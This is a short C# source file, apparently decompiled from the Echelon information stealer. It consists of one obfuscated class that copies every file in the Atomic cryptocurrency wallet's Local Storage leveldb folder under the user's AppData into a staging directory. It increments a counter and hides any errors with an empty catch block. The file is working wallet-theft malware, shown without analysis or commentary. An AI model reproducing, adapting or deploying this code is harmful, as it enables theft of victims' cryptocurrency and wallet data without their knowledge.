using Echelon;
using System.IO;

internal class aq
{
	public static string a = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";

	public static void a(string jl)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\atomic\\Local Storage\\leveldb\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(jl + aq.a);
				fileInfo.CopyTo(jl + aq.a + fileInfo.Name);
			}
			ba.a++;
		}
		catch
		{
		}
	}
}
